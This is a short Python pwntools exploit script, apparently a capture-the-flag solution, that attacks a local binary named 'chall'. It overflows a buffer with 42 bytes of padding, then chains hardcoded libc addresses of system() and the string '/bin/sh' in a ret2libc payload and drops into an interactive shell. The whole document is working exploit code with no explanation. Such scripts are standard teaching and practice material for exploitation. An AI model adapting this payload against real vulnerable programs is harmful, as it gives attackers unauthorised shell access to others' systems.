#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")
# elf = ELF("./chall")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")

libc_binsh_off = 0x17bb8f
libc_system_off = 0x3cd80

# libc_binsh_off = next(libc.search(b"/bin/sh"))
# libc_system_off = libc.symbols["system"]

# print("[*] libc system offset : 0x{:x}".format(libc_system_off))
# print("[*] libc /bin/sh offset : 0x{:x}".format(libc_binsh_off))

libc_base_addr = 0xf7dca000

libc_system_addr = libc_base_addr + libc_system_off
libc_binsh_addr = libc_base_addr + libc_binsh_off

print("[*] system : 0x{:x}".format(libc_system_addr))
print("[*] /bin/sh : 0x{:x}".format(libc_binsh_addr))

payload = b"A" * 42
payload += p32(libc_system_addr)
payload += b"BBBB"
payload += p32(libc_binsh_addr)

target.sendline(payload)

target.interactive()
